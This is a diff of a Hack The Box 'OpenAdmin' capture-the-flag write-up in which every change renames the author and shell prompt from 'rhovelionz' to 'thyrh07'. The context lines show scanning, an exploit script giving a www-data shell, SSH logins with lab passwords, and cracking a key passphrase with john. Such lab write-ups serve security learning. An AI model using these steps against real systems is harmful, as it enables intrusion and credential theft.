@@ -1,6 +1,6 @@
 ---
 title: Hackthebox - OpenAdmin
-author: Rhovelionz
+author: Thyrh07
 date: 2020-05-09 22:21:00 +0700
 categories: [Hackthebox]
 tags: [GtfoBins, Open Net Admin, Database, Php, Ssh, Cracking, John, Nano]
@@ -24,7 +24,7 @@ tags: [GtfoBins, Open Net Admin, Database, Php, Ssh, Cracking, John, Nano]
 ***
 
 ```
-root@rhovelionz:~# nmap -sC -sV -T4 -oA scans/nmap.full -p- -v  openadmin.htb
+root@thyrh07:~# nmap -sC -sV -T4 -oA scans/nmap.full -p- -v  openadmin.htb
 # Nmap 7.80 scan initiated Fri May  1 11:44:03 2020 as: nmap -sC -sV -T4 -oA scans/nmap.full -p- -v  openadmin.htb
 Nmap scan report for openadmin.htb (10.10.10.171)
 Host is up (0.27s latency).
@@ -57,7 +57,7 @@ Visiting the website on port `80`, we found `apache2 default page`.
 ## **<span style='color:#ff5555'>Gobuster</span>**
 ***
 ```
-root@rhovelionz:~# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -k   -x "txt,html,php,asp,aspx,jpg" -u http://openadmin.htb              
+root@thyrh07:~# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -k   -x "txt,html,php,asp,aspx,jpg" -u http://openadmin.htb              
 ===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
@@ -107,7 +107,7 @@ Now its time to run the script.....
 ## **<span style='color:#ff5555'>www-data</span>**
 ***
 ```
-root@rhovelionz:~# ./exploit.sh 
+root@thyrh07:~# ./exploit.sh 
 $ whoami
 www-data
 $ hostname
@@ -164,7 +164,7 @@ $
 We try to ssh with user `jimmy` by loggin in to `ssh`.
 
 ```
-root@rhovelionz:~# sshpass -p 'n1nj4W4rri0R!` jimmy@openadmin.htb
+root@thyrh07:~# sshpass -p 'n1nj4W4rri0R!` jimmy@openadmin.htb
 Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -387,11 +387,11 @@ Now we have the encrypted `private ssh keys`.
 
 First we have to make a crackable with john by using `ssh2john.py`
 ```
-root@rhovelionz:~# python2 /usr/share/john/ssh2john.py joanna_rsa >> hash-id_rsa
+root@thyrh07:~# python2 /usr/share/john/ssh2john.py joanna_rsa >> hash-id_rsa
 ```
 Now we can crack it with `john`
 ```
-root@rhovelionz:~# john hash-id_rsa -w=/usr/share/wordlists/rockyou.txt
+root@thyrh07:~# john hash-id_rsa -w=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
 Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
@@ -409,8 +409,8 @@ We have `bloodninjas` as the cracked **passphrase**
 
 Now it is time to login using the key of `joanna`
 ```
-root@rhovelionz:~# chmod 600 joanna_rsa
-root@rhovelionz:~# ssh -i joanna-id_rsa joanna@openadmin.htb
+root@thyrh07:~# chmod 600 joanna_rsa
+root@thyrh07:~# ssh -i joanna-id_rsa joanna@openadmin.htb
 Enter passphrase for key 'joanna-id_rsa': 
 Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)
 
